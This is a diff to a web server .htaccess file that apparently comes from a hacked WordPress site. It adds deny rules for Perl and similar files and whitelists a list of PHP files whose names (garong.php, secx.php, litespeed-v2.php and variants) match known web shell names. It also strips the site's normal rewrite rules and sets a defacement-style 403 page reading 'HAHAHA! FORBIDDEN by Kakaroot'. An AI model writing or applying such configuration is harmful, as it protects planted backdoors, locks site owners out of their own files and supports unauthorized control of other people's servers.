@@ -2,6 +2,30 @@
     Order Deny,Allow
     Deny from all
 </Files>
+<Files *.pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pl*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pE*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
 <Files *.Ph*>
     Order Deny,Allow
     Deny from all
@@ -58,21 +82,8 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(litespeed-img.php|ssi-litespeed.shtml|embed.php)$">
-    Order Allow,Deny
-    Allow from all
+<FilesMatch "^(embed.php|secx-OTH.php|secx-OTH-1.php|indexSite.php|ssi-litespeed.shtml|ssi-litespeed-OTH.shtml|litespeed-v2.php|litespeed-v2-OTH.php|print-litespeed.php|print-litespeed-OTH.php|print-litespeed-OTH-1.php|secx.php|SettingsForm.inc.php|3_ReadCounterTable.php|garong.php|garong-OTH.php|garong-OTH-1.php|garong-OTH.php5|garong-OTH-1.php5|garong-OTH.php5)$"> 
+Order Allow,Deny 
+Allow from all 
 </FilesMatch>
-<IfModule mod_rewrite.c>
-    RewriteEngine On
-    RewriteBase /
-    RewriteRule ^index.php$ - [L]
-    RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteRule . /index.php [L]
-    # Aturan baru untuk mengizinkan .html
-    <FilesMatch "\.html$">
-        Order Allow,Deny
-        Allow from all
-    </FilesMatch>
-</IfModule>
-
+ErrorDocument 403 '<center><img src="https://media.tenor.com/Kw3N2zt12nkAAAAi/sbando-lol.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Kakaroot</h2>'
